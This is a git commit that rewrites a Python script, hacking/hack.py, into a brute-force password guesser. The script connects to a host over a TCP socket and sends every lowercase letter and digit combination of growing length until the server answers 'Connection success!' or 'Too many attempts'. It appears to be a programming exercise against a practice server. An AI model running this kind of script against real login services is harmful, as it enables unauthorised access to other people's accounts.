eefb5a480b4dbc8e23aa4b3306f81917de96effd
zejiran <juanszalegria@gmail.com>
2020-09-01 20:52:18 -0500

    feat: generate brute force password
    Create a password generator, send password to server and obtain
    response from connection success, error, or too many attempts.

--- hacking/hack.py
+++ hacking/hack.py
@@ -4,23 +4,49 @@
 """
 import sys
 import socket
+import string
+import itertools
 
-args = sys.argv  # List of arguments.
-if len(args) != 4:
-    print("The script should be called with three arguments. The IP address, port, and message for sending.")
-else:
-    # Create a new socket.
-    with socket.socket() as client_socket:
-        # Connect to a host and a port using the socket.
-        hostname = args[1]
-        port = int(args[2])
-        address = (hostname, port)
-        client_socket.connect(address)
-        # Send a message from the third command line argument to the host using the socket.
-        message = args[3].encode()
-        client_socket.send(message)
-        # Receive the server's response.
-        response = client_socket.recv(1024)
-        response = response.decode()
-        # Print the server’s response.
-        print(response)
+
+def hack():
+    args = sys.argv  # List of arguments.
+    if len(args) != 3:
+        print("The script should be called with two arguments. The IP address, and port for sending.")
+    else:
+        letters_numbers = string.ascii_lowercase + string.digits
+        # Create a new socket.
+        with socket.socket() as client_socket:
+            # Connect to a host and a port using the socket.
+            hostname, port = args[1], int(args[2])
+            address = (hostname, port)
+            client_socket.connect(address)
+            # Try different passwords.
+            cycle_attempt = 1
+            while cycle_attempt <= 1000000:
+                cycle_combinations = itertools.product(range(len(letters_numbers)), repeat=cycle_attempt)
+                for combination in cycle_combinations:
+                    password = generate_password(combination, letters_numbers)
+                    # Send a password to the host using the socket.
+                    password = password.encode()
+                    client_socket.send(password)
+                    # Receive the server's response.
+                    response = client_socket.recv(1024)
+                    response = response.decode()
+                    # Check server response.
+                    if response == 'Connection success!':
+                        print(password.decode())
+                        exit()
+                    elif response == 'Too many attempts':
+                        exit()
+                cycle_attempt += 1
+
+
+def generate_password(index_combinations, to_combine):
+    new_password = ''
+    for index in index_combinations:
+        new_password += to_combine[index]
+    return new_password
+
+
+if __name__ == '__main__':
+    hack()
